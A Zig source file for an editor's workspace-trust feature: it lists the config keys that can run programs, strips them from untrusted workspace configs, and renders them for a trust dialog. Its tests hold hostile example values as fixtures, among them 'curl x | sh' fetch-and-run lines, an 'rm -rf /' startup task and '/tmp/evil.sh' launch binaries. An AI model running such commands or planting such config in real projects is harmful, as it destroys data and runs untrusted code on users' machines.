//! Workspace trust — the `exec_bearing` table (E1), the stripper for an
//! untrusted layer, and the claims that feed the trust dialog and its
//! fingerprint.
//!
//! A workspace's `.mnml/config.zon` is written by whoever owns the repo,
//! not by the user. Any key that ends in a `spawn` or a `$SHELL -c` is
//! therefore stripped from an untrusted workspace layer while everything
//! ordinary still applies: an untrusted `.lsp.rust` that only widens
//! `.extensions` keeps working against the home-configured binary, and
//! a `.startup.layout` entry of kind `.editor` is harmless and survives.
//!
//! The table is the single description of what counts as exec-bearing.
//! `strip` and `claims` switch on `Sink` exhaustively, so adding a row
//! without teaching both is a compile error.

const std = @import("std");
const Allocator = std.mem.Allocator;
const Config = @import("Config.zig");
const patch_mod = @import("patch.zig");
const Patch = patch_mod.Patch;

pub const Sink = enum {
    language_server,
    formatter,
    linter,
    debug_adapter,
    md_preview,
    startup_pty,
    startup_task,
    external_browser,
    /// `ai.launch_profiles[]` (a binary, its args and env, run when a
    /// session starts) and `ai.default_profile` (which of them a plain
    /// chip click runs). A profile list is whole-replace in a layer, so
    /// an untrusted one could put its own binary behind the AI chip.
    launch_profile,
    /// `ai.copilot.command` — the argv of the Copilot language server.
    /// A workspace that could set it would choose which binary runs
    /// every time you type.
    copilot_server,
    /// `ai.copilot_here` — not an argv but the switch that sends this
    /// workspace's buffer text to GitHub. A cloned repo must not be
    /// able to opt its reader in by shipping a config, so the key is
    /// stripped from an untrusted layer and listed as a claim the
    /// trust dialog names out loud.
    copilot_share,
    /// `<ws>/.mnml/init.lua` — not a config key but a file beside the
    /// config, which runs with the whole `mnml` table (tasks, panes,
    /// keys) once the workspace is trusted.
    init_lua,
    /// `<ws>/.mnml/integrations/*.zon` — manifests beside the config,
    /// each declaring commands that spawn a binary; registered only
    /// once the workspace is trusted.
    workspace_manifests,
    /// // changed (lua-install): an installed script
    /// (`<data root>/scripts/<name>/`). Not a config key either — a
    /// directory with a `script.zon`, whose manifest's commands and
    /// hooks (and whether its files call `task.run`) are the claims
    /// `script.install` puts on screen before the first run
    /// (`app/scripts.zig`).
    script_install,

    /// Human label for the trust dialog's bullet list.
    pub fn label(s: Sink) []const u8 {
        return switch (s) {
            .language_server => "language server",
            .formatter => "format on save",
            .linter => "linter",
            .debug_adapter => "debug adapter",
            .md_preview => "markdown preview",
            .startup_pty => "run at startup",
            .startup_task => "task at startup",
            .external_browser => "browser",
            .launch_profile => "AI launch profile",
            .copilot_server => "Copilot language server",
            .copilot_share => "Copilot sharing",
            .init_lua => "script",
            .workspace_manifests => "integration",
            .script_install => "script",
        };
    }

    /// When it fires, in the user's terms.
    pub fn trigger(s: Sink) []const u8 {
        return switch (s) {
            .language_server => "when you open a file",
            .formatter => "when you save",
            .linter => "when you lint",
            .debug_adapter => "when you start a debug session",
            .md_preview => "when you preview markdown",
            .startup_pty, .startup_task => "immediately, on open",
            .external_browser => "when you open a link",
            .launch_profile => "when you start a Claude / Codex session",
            .copilot_server => "when you type, with Copilot ghost text on",
            .copilot_share => "when you type, with Copilot ghost text on",
            .init_lua => "immediately, on open",
            .workspace_manifests => "when you run one of its commands",
            .script_install => "every time mnml starts",
        };
    }
};

pub const Rule = struct { path: []const u8, sink: Sink };

/// Every config path that can execute a program. Documentation for
/// humans (`docs/CONFIG.md` lists it) and the reference `strip` /
/// `claims` are written against.
pub const exec_bearing = [_]Rule{
    .{ .path = "ui.external_browser", .sink = .external_browser },
    .{ .path = "ui.md_preview_engine = .{ .custom = … }", .sink = .md_preview },
    .{ .path = "lsp.<name>.cmd / .args", .sink = .language_server },
    .{ .path = "formatters.<ext>", .sink = .formatter },
    .{ .path = "linters.<ext>", .sink = .linter },
    .{ .path = "dap.<name>", .sink = .debug_adapter },
    .{ .path = "startup.layout[] with .kind = .pty", .sink = .startup_pty },
    .{ .path = "startup.tasks", .sink = .startup_task },
    .{ .path = "ai.launch_profiles[] .binary / .args / .env / .worktree", .sink = .launch_profile },
    .{ .path = "ai.default_profile", .sink = .launch_profile },
    .{ .path = "ai.copilot.command", .sink = .copilot_server },
    .{ .path = "ai.copilot_here", .sink = .copilot_share },
    .{ .path = ".mnml/init.lua (the file beside the config)", .sink = .init_lua },
    .{ .path = ".mnml/integrations/*.zon (the manifests beside the config)", .sink = .workspace_manifests },
    .{ .path = "<data root>/scripts/<name>/ (an installed script's directory)", .sink = .script_install },
};

/// What the loader knows about the workspace beyond its config patch:
/// whether `<ws>/.mnml/init.lua` exists. The file is never merged into
/// the config, so it cannot be stripped; it simply does not run until
/// the workspace is trusted, and it is a claim so that adding one to a
/// trusted workspace asks again.
pub const Facts = struct {
    init_lua: bool = false,
    /// The `.zon` file names under `<ws>/.mnml/integrations/`, sorted.
    manifests: []const []const u8 = &.{},
};

/// The `.zon` names under `<ws>/.mnml/integrations/`, sorted — the
/// `Facts.manifests` a loader and the review build the same way.
pub fn manifestNames(arena: Allocator, io: std.Io, workspace: []const u8) Allocator.Error![]const []const u8 {
    const dir_path = try std.fs.path.join(arena, &.{ workspace, ".mnml", "integrations" });
    var dir = std.Io.Dir.cwd().openDir(io, dir_path, .{ .iterate = true }) catch return &.{};
    defer dir.close(io);
    var names: std.ArrayListUnmanaged([]const u8) = .empty;
    var it = dir.iterate();
    while (it.next(io) catch null) |entry| {
        if (entry.kind != .file or !std.mem.endsWith(u8, entry.name, ".zon")) continue;
        try names.append(arena, try arena.dupe(u8, entry.name));
    }
    std.mem.sort([]const u8, names.items, {}, struct {
        fn lt(_: void, a: []const u8, b: []const u8) bool {
            return std.mem.lessThan(u8, a, b);
        }
    }.lt);
    return names.toOwnedSlice(arena);
}

comptime {
    // Every sink has a row, every row a sink.
    for (@typeInfo(Sink).@"enum".fields) |f| {
        const sink = @field(Sink, f.name);
        var found = false;
        for (exec_bearing) |r| found = found or r.sink == sink;
        if (!found) @compileError("trust: no exec_bearing row for sink " ++ f.name);
    }
}

/// Remove every exec-bearing value from `p` in place. Returns how many
/// were removed (0 = the layer was harmless).
pub fn strip(arena: Allocator, p: *Patch(Config)) Allocator.Error!usize {
    var n: usize = 0;
    inline for (comptime std.enums.values(Sink)) |sink| n += try stripSink(sink, arena, p);
    return n;
}

fn stripSink(comptime sink: Sink, arena: Allocator, p: *Patch(Config)) Allocator.Error!usize {
    switch (sink) {
        .external_browser => {
            if (p.ui) |*ui| if (ui.external_browser != null) {
                ui.external_browser = null;
                return 1;
            };
            return 0;
        },
        .md_preview => {
            if (p.ui) |*ui| if (ui.md_preview_engine) |e| if (e == .custom) {
                ui.md_preview_engine = null;
                return 1;
            };
            return 0;
        },
        .language_server => {
            var n: usize = 0;
            for (p.lsp.values()) |*server| {
                if (server.cmd != null or server.args.len != 0) n += 1;
                server.cmd = null;
                server.args = &.{};
            }
            return n;
        },
        .formatter => {
            const n = p.formatters.count();
            p.formatters.clear();
            return n;
        },
        .linter => {
            const n = p.linters.count();
            p.linters.clear();
            return n;
        },
        .debug_adapter => {
            const n = p.dap.count();
            p.dap.clear();
            return n;
        },
        .startup_pty => {
            const startup = &(p.startup orelse return 0);
            const layout = startup.layout orelse return 0;
            var kept: std.ArrayList(Config.LayoutEntry) = .empty;
            for (layout) |e| if (e.kind != .pty) try kept.append(arena, e);
            const n = layout.len - kept.items.len;
            if (n != 0) startup.layout = try kept.toOwnedSlice(arena);
            return n;
        },
        .startup_task => {
            const startup = &(p.startup orelse return 0);
            const tasks = startup.tasks orelse return 0;
            if (tasks.len == 0) return 0;
            startup.tasks = &.{};
            return tasks.len;
        },
        .launch_profile => {
            const ai = &(p.ai orelse return 0);
            var n: usize = 0;
            if (ai.launch_profiles) |profiles| {
                n += profiles.len;
                ai.launch_profiles = null;
            }
            if (ai.default_profile) |dp| {
                if (dp.claude != null) n += 1;
                if (dp.codex != null) n += 1;
                ai.default_profile = null;
            }
            return n;
        },
        .copilot_server => {
            const ai = &(p.ai orelse return 0);
            const cop = &(ai.copilot orelse return 0);
            if (cop.command) |cmd| if (cmd.len != 0) {
                cop.command = null;
                return 1;
            };
            return 0;
        },
        // Not an argv — the switch that sends this workspace's text to
        // GitHub. Stripping it means an untrusted workspace's `true`
        // reads as the default `false`, which is the safe direction.
        .copilot_share => {
            const ai = &(p.ai orelse return 0);
            if (ai.copilot_here) |v| if (v) {
                ai.copilot_here = null;
                return 1;
            };
            return 0;
        },
        // Nothing in the patch: the file is gated by `workspace_trusted`.
        .init_lua => return 0,
        // Nothing in the patch either: the scan skips the directory.
        .workspace_manifests => return 0,
        // Nothing in the patch: a script is installed by hand, and the
        // dialog that installs it is the gate.
        .script_install => return 0,
    }
}

/// One executable thing a layer declares — what the trust dialog lists.
pub const Claim = struct {
    sink: Sink,
    /// The config key it came from: `lsp.rust`, `formatters.rs`, …
    key: []const u8,
    /// The command as it would run, verbatim — a hostile `curl … | sh`
    /// should be self-evident, a benign `rust-analyzer` equally so.
    command: []const u8,

    /// `language server rust — runs `rust-analyzer` when you open a file`
    pub fn format(c: Claim, w: *std.Io.Writer) std.Io.Writer.Error!void {
        try w.print("{s} {s} — runs `{s}` {s}", .{ c.sink.label(), c.entryName(), c.command, c.sink.trigger() });
    }

    /// `rust` from `lsp.rust`; the key itself when it has no entry part.
    pub fn entryName(c: Claim) []const u8 {
        if (std.mem.indexOfScalar(u8, c.key, '.')) |dot| {
            if (dot + 1 < c.key.len) return c.key[dot + 1 ..];
        }
        return c.key;
    }

    fn lessThan(_: void, a: Claim, b: Claim) bool {
        if (a.sink != b.sink) return @intFromEnum(a.sink) < @intFromEnum(b.sink);
        switch (std.mem.order(u8, a.key, b.key)) {
            .lt => return true,
            .gt => return false,
            .eq => return std.mem.order(u8, a.command, b.command) == .lt,
        }
    }
};

/// The claims one installed script makes, in the same `Claim` shape
/// the workspace dialog lists — so the two dialogs read alike and one
/// `format` renders both. `commands` and `hooks` are the manifest's;
/// `runs_tasks` is what a grep of its own files found.
pub fn scriptClaims(arena: Allocator, name: []const u8, commands: []const []const u8, hooks: []const []const u8, runs_tasks: bool) Allocator.Error![]Claim {
    var out: std.ArrayList(Claim) = .empty;
    for (commands) |c| try out.append(arena, .{
        .sink = .script_install,
        .key = try std.fmt.allocPrint(arena, "script.{s}", .{name}),
        .command = try std.fmt.allocPrint(arena, "{s} (a command)", .{c}),
    });
    for (hooks) |h| try out.append(arena, .{
        .sink = .script_install,
        .key = try std.fmt.allocPrint(arena, "script.{s}", .{name}),
        .command = try std.fmt.allocPrint(arena, "{s} (a hook)", .{h}),
    });
    try out.append(arena, .{
        .sink = .script_install,
        .key = try std.fmt.allocPrint(arena, "script.{s}", .{name}),
        .command = if (runs_tasks) "task.run — it starts programs" else "no task.run — it starts no programs",
    });
    return out.toOwnedSlice(arena);
}

fn joinArgs(arena: Allocator, cmd: []const u8, args: []const []const u8) Allocator.Error![]const u8 {
    if (args.len == 0) return cmd;
    var out: std.ArrayList(u8) = .empty;
    try out.appendSlice(arena, cmd);
    for (args) |a| {
        try out.append(arena, ' ');
        try out.appendSlice(arena, a);
    }
    return out.toOwnedSlice(arena);
}

fn joinList(arena: Allocator, parts: []const []const u8) Allocator.Error![]const u8 {
    return std.mem.join(arena, " ", parts);
}

/// Everything in `p` that would execute, sorted and stable, so the same
/// file always lists (and fingerprints) the same way.
pub fn claims(arena: Allocator, p: Patch(Config)) Allocator.Error![]Claim {
    return claimsWith(arena, p, .{});
}

/// `claims` plus what the loader saw beside the config.
pub fn claimsWith(arena: Allocator, p: Patch(Config), facts: Facts) Allocator.Error![]Claim {
    var out: std.ArrayList(Claim) = .empty;
    inline for (comptime std.enums.values(Sink)) |sink| try collect(sink, arena, p, facts, &out);
    std.mem.sort(Claim, out.items, {}, Claim.lessThan);
    return out.toOwnedSlice(arena);
}

fn collect(comptime sink: Sink, arena: Allocator, p: Patch(Config), facts: Facts, out: *std.ArrayList(Claim)) Allocator.Error!void {
    switch (sink) {
        // An installed script is never part of a config layer: it is
        // installed by hand, and `script.install`'s own dialog is where
        // its claims are shown (`scriptClaims`).
        .script_install => {},
        .init_lua => {
            if (facts.init_lua) try out.append(arena, .{ .sink = sink, .key = "script.init", .command = ".mnml/init.lua" });
        },
        .workspace_manifests => {
            for (facts.manifests) |name| {
                const stem = if (std.mem.endsWith(u8, name, ".zon")) name[0 .. name.len - 4] else name;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "integrations.{s}", .{stem}),
                    .command = try std.fmt.allocPrint(arena, ".mnml/integrations/{s}", .{name}),
                });
            }
        },
        .external_browser => {
            const ui = p.ui orelse return;
            const b = ui.external_browser orelse return;
            if (b.len != 0) try out.append(arena, .{ .sink = sink, .key = "ui.external_browser", .command = b });
        },
        .md_preview => {
            const ui = p.ui orelse return;
            const e = ui.md_preview_engine orelse return;
            if (e == .custom and e.custom.len != 0) try out.append(arena, .{ .sink = sink, .key = "ui.md_preview_engine", .command = e.custom });
        },
        .language_server => {
            var it = p.lsp.iterator();
            while (it.next()) |e| {
                const cmd = e.value_ptr.cmd orelse continue;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "lsp.{s}", .{e.key_ptr.*}),
                    .command = try joinArgs(arena, cmd, e.value_ptr.args),
                });
            }
        },
        .formatter => {
            var it = p.formatters.iterator();
            while (it.next()) |e| {
                if (e.value_ptr.cmd.len == 0) continue;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "formatters.{s}", .{e.key_ptr.*}),
                    .command = try joinList(arena, e.value_ptr.cmd),
                });
            }
        },
        .linter => {
            var it = p.linters.iterator();
            while (it.next()) |e| {
                if (e.value_ptr.cmd.len == 0) continue;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "linters.{s}", .{e.key_ptr.*}),
                    .command = try joinList(arena, e.value_ptr.cmd),
                });
            }
        },
        .debug_adapter => {
            var it = p.dap.iterator();
            while (it.next()) |e| {
                if (e.value_ptr.cmd.len == 0) continue;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "dap.{s}", .{e.key_ptr.*}),
                    .command = try joinArgs(arena, e.value_ptr.cmd, e.value_ptr.args),
                });
            }
        },
        .startup_pty => {
            const startup = p.startup orelse return;
            for (startup.layout orelse return) |e| {
                if (e.kind != .pty) continue;
                const cmd = e.cmd orelse continue;
                if (cmd.len != 0) try out.append(arena, .{ .sink = sink, .key = "startup.layout", .command = cmd });
            }
        },
        .copilot_server => {
            const ai = p.ai orelse return;
            const cop = ai.copilot orelse return;
            const cmd = cop.command orelse return;
            if (cmd.len != 0) try out.append(arena, .{ .sink = sink, .key = "ai.copilot.command", .command = try joinList(arena, cmd) });
        },
        .copilot_share => {
            const ai = p.ai orelse return;
            const on = ai.copilot_here orelse return;
            if (on) try out.append(arena, .{
                .sink = sink,
                .key = "ai.copilot_here",
                .command = "send this workspace's open files to GitHub Copilot",
            });
        },
        .launch_profile => {
            const ai = p.ai orelse return;
            for (ai.launch_profiles orelse &.{}) |profile| {
                if (profile.binary.len == 0) continue;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "ai.launch_profiles.{s}", .{profile.name}),
                    .command = try joinArgs(arena, profile.binary, profile.args),
                });
            }
            if (ai.default_profile) |dp| {
                // The claim is "a plain chip click runs profile <name>";
                // the binary behind the name may sit in a trusted layer.
                inline for (.{ "claude", "codex" }) |product| {
                    if (@field(dp, product)) |name| if (name.len != 0) try out.append(arena, .{
                        .sink = sink,
                        .key = "ai.default_profile." ++ product,
                        .command = name,
                    });
                }
            }
        },
        .startup_task => {
            const startup = p.startup orelse return;
            for (startup.tasks orelse return) |name| {
                // The task body may live in a trusted layer; what this
                // layer asserts is "run <name> on open", so that is the
                // claim.
                const body: []const u8 = if (p.tasks.get(name)) |task| task.cmd else name;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "startup.tasks.{s}", .{name}),
                    .command = body,
                });
            }
        },
    }
}

/// Stable digest of a claim set: same claims ⇒ same value across runs
/// and machines; any change to a command changes it. Not a security
/// primitive — whoever can edit the workspace config to forge a match
/// can already edit the config, which is the thing being gated. It
/// exists so a workspace trusted once stays trusted until its exec
/// claims change.
pub fn fingerprint(list: []const Claim) u64 {
    var h = std.hash.Fnv1a_64.init();
    for (list) |c| {
        h.update(@tagName(c.sink));
        h.update("\x1f");
        h.update(c.key);
        h.update("\x1f");
        h.update(c.command);
        h.update("\n");
    }
    return h.final();
}

pub fn fingerprintHex(list: []const Claim) [16]u8 {
    var buf: [16]u8 = undefined;
    _ = std.fmt.bufPrint(&buf, "{x:0>16}", .{fingerprint(list)}) catch unreachable;
    return buf;
}

// ─── tests ───────────────────────────────────────────────────────────────

const load = @import("load.zig");
const Diagnostics = @import("diag.zig").Diagnostics;
const t = std.testing;

const hostile_layer =
    \\.{
    \\    .ui = .{
    \\        .md_preview_engine = .{ .custom = "sh -c 'curl x | sh'" },
    \\        .external_browser = "evil-browser",
    \\        .tree_width = 42,
    \\    },
    \\    .lsp = .{
    \\        .rust = .{ .cmd = "/bin/sh", .args = .{ "-c", "curl x|sh" }, .extensions = .{ "rs", "rst" } },
    \\    },
    \\    .formatters = .{ .rs = .{ .cmd = .{ "rustfmt" } } },
    \\    .linters = .{ .sh = .{ .cmd = .{ "shellcheck" }, .parser = .shellcheck } },
    \\    .dap = .{ .lldb = .{ .cmd = "lldb-dap" } },
    \\    .tasks = .{ .evil = .{ .cmd = "rm -rf /" } },
    \\    .startup = .{
    \\        .tasks = .{ "evil" },
    \\        .layout = .{
    \\            .{ .kind = .editor, .path = "README.md" },
    \\            .{ .kind = .pty, .cmd = "curl x | sh", .split = .right },
    \\        },
    \\    },
    \\    .editor = .{ .tab_width = 2 },
    \\    .ai = .{
    \\        .launch_profiles = .{ .{ .name = "evil", .product = .claude, .binary = "/tmp/evil.sh", .args = .{"--yes"} } },
    \\        .default_profile = .{ .claude = "evil" },
    \\        .inline_suggestions = false,
    \\    },
    \\}
;

test "an untrusted layer loses exactly the exec-bearing keys" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    var diags = Diagnostics.init(arena);
    var p = try load.parseLayer(arena, hostile_layer, "ws.zon", &diags);
    try t.expectEqual(@as(usize, 0), diags.count());

    const before = try claims(arena, p);
    try t.expectEqual(@as(usize, 10), before.len);

    const removed = try strip(arena, &p);
    try t.expectEqual(@as(usize, 10), removed);

    // gone
    try t.expect(p.ui.?.md_preview_engine == null);
    try t.expect(p.ui.?.external_browser == null);
    try t.expect(p.lsp.get("rust").?.cmd == null);
    try t.expectEqual(@as(usize, 0), p.lsp.get("rust").?.args.len);
    try t.expectEqual(@as(usize, 0), p.formatters.count());
    try t.expectEqual(@as(usize, 0), p.linters.count());
    try t.expectEqual(@as(usize, 0), p.dap.count());
    try t.expectEqual(@as(usize, 0), p.startup.?.tasks.?.len);
    try t.expectEqual(@as(usize, 1), p.startup.?.layout.?.len);
    try t.expectEqual(Config.LayoutKind.editor, p.startup.?.layout.?[0].kind);
    try t.expect(p.ai.?.launch_profiles == null);
    try t.expect(p.ai.?.default_profile == null);
    // kept
    try t.expectEqual(@as(?bool, false), p.ai.?.inline_suggestions);
    try t.expectEqual(@as(usize, 2), p.lsp.get("rust").?.extensions.len);
    try t.expectEqual(@as(?u16, 42), p.ui.?.tree_width);
    try t.expectEqual(@as(?u8, 2), p.editor.?.tab_width);
    try t.expectEqual(@as(usize, 1), p.tasks.count()); // a task body is only run on request

    const after = try claims(arena, p);
    try t.expectEqual(@as(usize, 0), after.len);
    try t.expectEqual(@as(usize, 0), try strip(arena, &p)); // idempotent
}

test "an untrusted workspace cannot opt itself into Copilot, nor choose the binary" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    var diags = Diagnostics.init(arena);
    // A repo you cloned, shipping its own `.mnml/config.zon`. Nothing
    // here is a shell line, which is exactly why it is worth pinning:
    // `copilot_here` is a plain `true` whose effect is that every file
    // you open leaves the machine.
    var p = try load.parseLayer(arena,
        \\.{ .ai = .{
        \\    .copilot_here = true,
        \\    .copilot = .{ .command = .{ "/tmp/evil", "--stdio" } },
        \\    .suggest_idle_ms = 900,
        \\} }
    , "ws.zon", &diags);
    try t.expectEqual(@as(usize, 0), diags.count());

    // Both are claims the dialog names by hand before anything runs.
    const before = try claims(arena, p);
    try t.expectEqual(@as(usize, 2), before.len);
    var buf: [256]u8 = undefined;
    for (before) |c| {
        var w: std.Io.Writer = .fixed(&buf);
        try c.format(&w);
        if (c.sink == .copilot_server) {
            try t.expectEqualStrings("Copilot language server copilot.command — runs `/tmp/evil --stdio` when you type, with Copilot ghost text on", w.buffered());
        } else {
            try t.expectEqual(Sink.copilot_share, c.sink);
            try t.expectEqualStrings("ai.copilot_here", c.key);
            try t.expect(std.mem.indexOf(u8, w.buffered(), "send this workspace's open files to GitHub Copilot") != null);
        }
    }

    // Untrusted: both go, and the opt-in reads as its default `false` —
    // the safe direction. An ordinary key beside them is untouched.
    try t.expectEqual(@as(usize, 2), try strip(arena, &p));
    try t.expect(p.ai.?.copilot_here == null);
    try t.expect(p.ai.?.copilot.?.command == null);
    try t.expectEqual(@as(?u16, 900), p.ai.?.suggest_idle_ms);
    try t.expectEqual(@as(usize, 0), (try claims(arena, p)).len);
    try t.expectEqual(@as(usize, 0), try strip(arena, &p)); // idempotent

    // A layer that only turns it OFF claims nothing: the switch is a
    // claim in one direction only.
    var off = try load.parseLayer(arena, ".{ .ai = .{ .copilot_here = false } }", "ws.zon", &diags);
    try t.expectEqual(@as(usize, 0), (try claims(arena, off)).len);
    try t.expectEqual(@as(usize, 0), try strip(arena, &off));
}

test "claims render for the dialog, sorted, with the verbatim command" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    var diags = Diagnostics.init(arena);
    const p = try load.parseLayer(arena, hostile_layer, "ws.zon", &diags);
    const list = try claims(arena, p);
    try t.expectEqual(Sink.language_server, list[0].sink);
    try t.expectEqualStrings("lsp.rust", list[0].key);
    try t.expectEqualStrings("rust", list[0].entryName());
    try t.expectEqualStrings("/bin/sh -c curl x|sh", list[0].command);
    var buf: [256]u8 = undefined;
    var w: std.Io.Writer = .fixed(&buf);
    try list[0].format(&w);
    try t.expectEqualStrings("language server rust — runs `/bin/sh -c curl x|sh` when you open a file", w.buffered());
    // startup task claims carry the body when this layer defines it
    var found = false;
    for (list) |c| if (c.sink == .startup_task) {
        try t.expectEqualStrings("startup.tasks.evil", c.key);
        try t.expectEqualStrings("rm -rf /", c.command);
        found = true;
    };
    try t.expect(found);
    // a launch profile claims its binary and args; the default names the profile
    var profile_claims: usize = 0;
    for (list) |c| if (c.sink == .launch_profile) {
        profile_claims += 1;
        if (std.mem.eql(u8, c.key, "ai.launch_profiles.evil")) try t.expectEqualStrings("/tmp/evil.sh --yes", c.command);
        if (std.mem.eql(u8, c.key, "ai.default_profile.claude")) try t.expectEqualStrings("evil", c.command);
    };
    try t.expectEqual(@as(usize, 2), profile_claims);
    // sorted: sinks in table order, launch_profile after external_browser, last
    try t.expectEqual(Sink.launch_profile, list[list.len - 1].sink);
    try t.expectEqual(Sink.external_browser, list[list.len - 3].sink);
}

test "an init.lua beside the config is a claim of its own, and moves the fingerprint" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    var diags = Diagnostics.init(arena);
    const p = try load.parseLayer(arena, ".{ .editor = .{ .tab_width = 2 } }", "ws.zon", &diags);
    try t.expectEqual(@as(usize, 0), (try claims(arena, p)).len);
    const with = try claimsWith(arena, p, .{ .init_lua = true });
    try t.expectEqual(@as(usize, 1), with.len);
    try t.expectEqual(Sink.init_lua, with[0].sink);
    var buf: [256]u8 = undefined;
    var w: std.Io.Writer = .fixed(&buf);
    try with[0].format(&w);
    try t.expectEqualStrings("script init — runs `.mnml/init.lua` immediately, on open", w.buffered());
    try t.expect(fingerprint(with) != fingerprint(try claims(arena, p)));
    // Stripping has nothing to remove: the file is gated, not merged.
    var q = p;
    try t.expectEqual(@as(usize, 0), try strip(arena, &q));
}

test "a workspace manifest beside the config is a claim of its own — one per file — and moves the fingerprint; nothing to strip" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    var diags = Diagnostics.init(arena);
    const p = try load.parseLayer(arena, ".{ .editor = .{ .tab_width = 2 } }", "ws.zon", &diags);
    const with = try claimsWith(arena, p, .{ .manifests = &.{ "deploy.zon", "lint.zon" } });
    try t.expectEqual(@as(usize, 2), with.len);
    try t.expectEqual(Sink.workspace_manifests, with[0].sink);
    try t.expectEqualStrings("integrations.deploy", with[0].key);
    try t.expectEqualStrings(".mnml/integrations/deploy.zon", with[0].command);
    var buf: [256]u8 = undefined;
    var w: std.Io.Writer = .fixed(&buf);
    try with[1].format(&w);
    try t.expectEqualStrings("integration lint — runs `.mnml/integrations/lint.zon` when you run one of its commands", w.buffered());
    try t.expect(fingerprint(with) != fingerprint(try claims(arena, p)));
    try t.expect(fingerprint(with) != fingerprint(try claimsWith(arena, p, .{ .manifests = &.{"deploy.zon"} })));
    var q = p;
    try t.expectEqual(@as(usize, 0), try strip(arena, &q));
}

test "fingerprint is stable, change-sensitive, and blind to ordinary edits" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    var diags = Diagnostics.init(arena);
    const a = try load.parseLayer(arena, ".{ .lsp = .{ .rust = .{ .cmd = \"rust-analyzer\" } }, .editor = .{ .tab_width = 2 } }", "a", &diags);
    const b = try load.parseLayer(arena, ".{ .editor = .{ .tab_width = 8 }, .lsp = .{ .rust = .{ .cmd = \"rust-analyzer\" } } }", "b", &diags);
    const c = try load.parseLayer(arena, ".{ .lsp = .{ .rust = .{ .cmd = \"rust-analyzer\", .args = .{ \"--log\" } } } }", "c", &diags);
    const fa = fingerprint(try claims(arena, a));
    const fb = fingerprint(try claims(arena, b));
    const fc = fingerprint(try claims(arena, c));
    try t.expectEqual(fa, fb);
    try t.expect(fa != fc);
    try t.expectEqual(fa, fingerprint(try claims(arena, a)));
    const empty = try claims(arena, .{});
    try t.expectEqual(@as(usize, 0), empty.len);
    try t.expect(fingerprint(empty) != fa);
    try t.expectEqual(@as(usize, 16), fingerprintHex(empty).len);
}
